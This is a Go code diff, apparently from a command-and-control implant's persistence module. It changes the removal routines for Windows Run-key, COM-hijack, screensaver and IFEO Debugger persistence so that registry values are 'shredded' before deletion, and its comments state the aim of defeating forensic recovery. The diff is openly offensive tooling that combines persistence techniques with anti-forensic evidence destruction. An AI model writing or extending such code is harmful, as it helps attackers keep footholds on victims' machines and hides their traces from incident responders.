@@ -154,7 +154,7 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 		}
 
 	case "remove":
-		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE)
+		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("Error opening %s\\%s: %v", hive, regPath, err),
@@ -164,16 +164,11 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 		}
 		defer key.Close()
 
-		if err := key.DeleteValue(args.Name); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error removing value '%s': %v", args.Name, err),
-				Status:    "error",
-				Completed: true,
-			}
-		}
+		// Shred value before deletion to defeat forensic registry recovery
+		shredRegistryValue(key, args.Name)
 
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed registry run key:\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name),
+			Output:    fmt.Sprintf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name),
 			Status:    "success",
 			Completed: true,
 		}
@@ -489,21 +484,15 @@ func persistCOMHijack(args persistArgs) structs.CommandResult {
 		}
 
 	case "remove":
-		// Delete InprocServer32 key first, then the CLSID key
-		if err := registry.DeleteKey(registry.CURRENT_USER, keyPath); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error removing InprocServer32 key: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
-		}
+		// Shred values then delete InprocServer32 key, then the CLSID key
+		shredRegistryKey(registry.CURRENT_USER, keyPath)
 
 		parentPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
 		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
 		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)
 
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed COM hijack persistence:\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath),
+			Output:    fmt.Sprintf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath),
 			Status:    "success",
 			Completed: true,
 		}
@@ -593,7 +582,7 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 		}
 
 	case "remove":
-		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
+		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("Error opening HKCU\\%s: %v", desktopKeyPath, err),
@@ -603,13 +592,13 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 		}
 		defer key.Close()
 
-		// Remove the screensaver executable
-		_ = key.DeleteValue("SCRNSAVE.EXE")
+		// Shred the screensaver executable path before deletion
+		shredRegistryValue(key, "SCRNSAVE.EXE")
 		// Disable screensaver
 		_ = key.SetStringValue("ScreenSaveActive", "0")
 
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed screensaver persistence:\n  Deleted SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
+			Output:    fmt.Sprintf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
 			Status:    "success",
 			Completed: true,
 		}
@@ -694,7 +683,7 @@ func persistIFEO(args persistArgs) structs.CommandResult {
 		}
 
 	case "remove":
-		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
+		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("Error opening HKLM\\%s: %v", keyPath, err),
@@ -704,16 +693,11 @@ func persistIFEO(args persistArgs) structs.CommandResult {
 		}
 		defer key.Close()
 
-		if err := key.DeleteValue("Debugger"); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error removing Debugger value: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
-		}
+		// Shred Debugger value before deletion to defeat forensic recovery
+		shredRegistryValue(key, "Debugger")
 
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed IFEO persistence:\n  Key:    HKLM\\%s\n  Deleted Debugger value", keyPath),
+			Output:    fmt.Sprintf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath),
 			Status:    "success",
 			Completed: true,
 		}
